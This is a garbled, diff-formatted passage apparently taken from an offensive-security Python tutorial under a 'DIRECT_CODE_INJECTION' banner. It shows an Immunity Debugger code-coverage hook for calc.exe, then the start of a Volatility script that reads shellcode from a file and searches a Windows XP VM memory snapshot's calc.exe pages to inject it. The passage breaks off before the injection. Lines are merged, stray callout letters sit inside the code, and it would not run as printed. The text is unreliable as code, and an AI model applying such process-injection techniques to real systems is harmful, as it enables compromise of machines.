@@ -1,0 +1,40 @@
+[#DIRECT_CODE_INJECTION]::::::::::::::::: -----------------------------
+The Eye Of Cyber
+[+]------------------+--------------------[+]
+from immlib
+import * class
+cc_hook(LogBpHook): def __init__(self):
+LogBpHook.__init__(self)
+self.imm = Debugger()
+def run(self,regs):
+self.imm.log("%08x" % regs['EIP'],regs['EIP']) self.imm.deleteBreakpoint(regs['EIP'])
+return
+def main(args):
+imm = Debugger()
+calc = imm.getModule("calc.exe") imm.analyseCode(calc.getCodebase())
+functions = imm.getAllFunctions(calc.getCodebase()) hooker = cc_hook()
+for function in functions: hooker.add("%08x" % function, function)
+return "Tracking %d functions." % len(functions)
+codecoverage
+Open a new fle, name it code_inject.py, and hammer out the following code.
+
+import sys import struct
+equals_button = 0x01005D51
+memory_file = "WinXPSP2.vmem" slack_space = None trampoline_offset = None
+# read in our shellcode
+u sc_fd = open("cmeasure.bin","rb") sc = sc_fd.read() sc_fd.close()
+sys.path.append("/Users/justin/Downloads/volatility-2.3.1")
+import volatility.conf as conf
+import volatility.registry as registry
+registry.PluginImporter() config = conf.ConfObject()
+import volatility.commands as commands import volatility.addrspace as addrspace
+registry.register_global_options(config, commands.Command) registry.register_global_options(config, addrspace.BaseAddressSpace)
+config.parse_options() config.PROFILE = "WinXPSP2x86" config.LOCATION = "file://%s" % memory_file
+This setup code is identical to the previous code you wrote, with the exception that we’re reading in the shellcode u that we will inject into the VM.
+Now let’s put the rest of the code in place to actually perform the injection.
+import volatility.plugins.taskmods as taskmods u p = taskmods.PSList(config) v for process in p.calculate():
+if str(process.ImageFileName) == "calc.exe":
+print "[*] Found calc.exe with PID %d" % process.UniqueProcessId print "[*] Hunting for physical offsets...please wait."
+address_space = process.get_process_address_space() x pages = address_space.get_available_pages()
+for page in pages:
+u
